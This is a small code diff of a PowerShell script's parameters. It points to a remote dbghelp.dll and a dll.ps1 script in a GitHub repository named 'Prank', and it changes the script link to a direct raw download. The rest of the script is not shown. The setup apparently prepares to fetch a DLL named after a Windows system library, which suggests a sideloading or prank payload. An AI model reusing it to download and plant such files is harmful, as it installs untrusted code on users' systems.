@@ -1,7 +1,7 @@
 param(
     [string]$u = 'https://github.com/DuckkyDx/Prank/raw/refs/heads/main/dbghelp.dll',
     [string]$p = '',
-    [string]$s = 'https://github.com/DuckkyDx/Prank/blob/main/dll.ps1'
+    [string]$s = 'https://github.com/DuckkyDx/Prank/raw/refs/heads/main/dll.ps1'
 )
 
 $ProgressPreference = 'Continue'
